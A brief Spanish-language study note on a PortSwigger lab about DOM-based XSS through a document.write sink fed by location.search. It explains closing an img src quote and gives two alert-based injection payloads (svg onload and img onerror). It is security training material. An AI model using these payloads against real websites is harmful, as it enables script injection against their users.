Tags: #XSS #PortSwigger 
# Lab 3 DOM XSS in document.write sink using source location.search

```javaScript
// Para este tipo de ataque, debemos de buscar la manera de poder inyectar codigo JavaScript

1. Mirar el codigo fuente en donde estamos colocando texto, esto en 'img src=" ">'
2. Ver la manera de poder cerrar alguna comilla para poder inyectar codigo JavaScript

"><svg/onload=alert(1)>
"><img src/onerror=alert(document.domain)>

// Podemos hacerlo de cualquiera de las dos formas anteriores, solo debemos de cerrar la etiqueta del codigo fuente 
```
